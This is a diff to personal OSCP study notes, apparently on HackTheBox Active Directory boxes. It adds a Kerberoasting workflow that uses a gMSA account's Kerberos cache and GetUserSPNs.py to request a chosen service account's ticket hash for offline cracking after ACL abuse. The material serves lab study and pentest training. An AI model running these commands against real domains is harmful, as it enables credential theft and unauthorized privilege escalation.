@@ -31,6 +31,21 @@ $krb5tgs$23$*svc_web$HTB.LOCAL$...HASH...
 
 Kerberoasting targets service accounts with registered SPNs. It is separate from AS-REP roasting.
 
+### Ccache and targeted-SPN workflow
+
+When NTLM is disabled, use the Kerberos cache. If automatic enumeration fails because the installed Impacket release attempts an NTLM/name-based lookup, use LDAP/BloodHound to identify the exact account and request only that user:
+
+```bash
+printf '%s\n' $Username2 > $BoxDir/loot/spn-targets.txt
+KRB5_CONFIG=$BoxDir/notes/krb5.conf \
+KRB5CCNAME=$BoxDir/loot/gMSA01$.ccache \
+  GetUserSPNs.py "$Domain/gMSA01$" -k -no-pass -dc-ip $BoxIP \
+  -usersfile $BoxDir/loot/spn-targets.txt \
+  -outputfile $BoxDir/loot/kerberoast.hashes
+```
+
+After changing group membership, enabling an account, or setting an SPN through ACL abuse, renew the controlling account's TGT before requesting the service ticket.
+
 ## Gotcha
 
 > [!warning] 💡
@@ -38,6 +53,7 @@ Kerberoasting targets service accounts with registered SPNs. It is separate from
 ## Seen in
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- AD technique reference
 - [[OSCP/BOXES/WRITE UPS/AD/Active|Active]] -- service-account access requested and cracked the administrator CIFS ticket
+- [[OSCP/BOXES/WRITE UPS/AD/Vintage|Vintage]] -- gMSA enabled `svc_sql`, set an SPN, used a targeted `-usersfile` request, and cracked the ticket
 
 ## Related stages
 
